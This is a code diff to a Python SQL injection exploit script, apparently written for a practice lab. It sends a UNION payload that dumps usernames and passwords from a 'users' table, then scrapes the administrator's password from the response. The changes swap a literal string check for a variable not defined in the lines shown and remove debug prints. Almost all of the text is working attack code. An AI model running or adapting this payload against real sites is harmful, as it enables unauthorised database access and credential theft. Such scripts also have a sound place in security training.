@@ -13,7 +13,7 @@ def exploit_sqli_users_table(url):
     sql_payload = "' UNION select NULL, username||'**'|| password from users--"
     r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
     res = r.text
-    if 'administrator' in res:
+    if username in res:
         print('[+] Found the administrator password...')
         soup = BeautifulSoup(r.text, 'html.parser')
         admin_password = soup.find(text=re.compile('.*administrator.*')).split('**')[1]
@@ -23,8 +23,6 @@ def exploit_sqli_users_table(url):
 
 if __name__ == "__main__":
     try:
-        print(sys.argv[1].strip())
-        print('**')
         url = sys.argv[1].strip()
     except IndexError:
         print(f'[-] Usage: {sys.argv[0]} <url>')
